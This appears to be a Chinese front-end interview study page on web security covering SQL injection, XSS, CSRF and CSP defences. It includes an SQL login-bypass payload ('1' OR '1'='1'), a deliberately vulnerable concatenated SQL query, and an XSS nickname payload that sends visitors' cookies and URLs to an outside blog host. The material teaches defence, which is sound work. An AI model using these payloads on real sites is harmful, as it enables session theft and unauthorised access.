---
nav:
  title: 面试
  path: /interview
toc: content
group:
  title: 💊 面试题库
  order: 2
---

# 安全

1. 引用 js 包（内容很少，也可以将内容拷贝出来，直接引用方法）
2. 将需要提交的数据经过 filter 即可，如下：

```javascript
浏览器自带转换为字符串
var newValue = safetools.encode(value)

正则加密（可能有兼容）
var newValue = safetools.reEncode(value)

正则解密（可能有兼容）
var newValue = safetools.reDecode(value)
```

> tag: 前端交互，涉及到数据流动并需要在返回在页面上显示的，一定要经过后端！

## 在项目里关于前端安全，可以采取以下措施

使用 HTTPS 确保数据在传输过程中的安全性。
验证用户输入，防范 XSS 攻击，使用 CORS 控制跨域资源访问。
更新依赖库和框架，以修补已知的安全漏洞。
避免在前端存储敏感信息，如密码，而依赖后端处理。
定期审查和更新安全策略，以适应新的威胁和最佳实践。

## 常见的攻击手段

### 1. SQL 脚本注入攻击于与防御

#### 概念

> 用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的 SQL Injection，即 SQL 注入.

#### 场景

语句

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果恶意填入：

> userName = "1' OR '1'='1"; passWord = "1' OR '1'='1";

既可实现无密码登录，美滋滋吧...

#### 处理方式

前端和 XSS 处理类似，对传递的数据进行筛选，重点是后端对数据的处理！

### 2. XSS 攻击与防御

#### 概念

> 跨站脚本（Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了 HTML 以及用户端脚本语言。
> XSS 攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java，VBScript，ActiveX，Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。

#### 类型

##### 简单分类

1. 反射型 xss

通过一次 xss 请求，将数据渲染到页面，请求 -> 返回数据，例子：搜索

2. 储存型 xss

通过一次 xss 请求，直接将数据储存在数据库，下次调用无需继续请求，例如：评论

##### 复杂分类

1. client 型
2. server 型

#### 处理方式

- 编码

> 将 > ( 标签转换为字符串，可以处理大多数 xss 攻击

- 过滤

> 有的语句并不完全依赖<>标签，例如 src="javascript:alert(1);"

- 校正

> 这个照理来说应该后端处理，目前没碰到这种场景

```javascript
> 一个直播平台，用户可以进入观看，主播可以设置自己的昵称:
var starNickName = '${starNickname}'
```

这怕是要翻水水了...假设是我是主播，我把昵称设置为：

```javascript
';window.location.href="http//:blog.jzxer.cn/?cook=" + document.cookie + '&url=' window.location.href;''
```

这一串如果传到后端，而后端又没有校正的话的话，这怕是傻眼了...观众进来一个死一个，我应该也会进去蹲几天吧，吧。。。

- CSP

```html
在头部加入：

<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"
/>
```

meta：不信任任何 URL，即不加载任何资源样式表只信任 cdn.example.org 和 third-party.org 框架 (frame) 必须使用 HTTPS 协议加载 其他资源：没有限制 启用后，不符合 CSP 的外部资源就会被阻止加载。

> 注意：该属性目前比较新，hotfix 和 chorme 支持较好，并不适用于所有的浏览器。

### 3. CSRF

> 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

#### 处理方式

- 验证码

在请求的同时，带个 token,或者验证码

- Referer Check

这个可以伪造...但加入更保险

> 注意：如果网站有 XSS 漏洞或者一些跨域漏洞，可能导致 Token 泄露。 在 XSS 攻击下，读取 Token 值，然后再构造出一个合法的请求，可以称为：XSRF。

### 小结

web 安全是个需要长期坚持的事情，没有绝对安全的产品，我们需要做到的就是能够提前预防和及时修复。
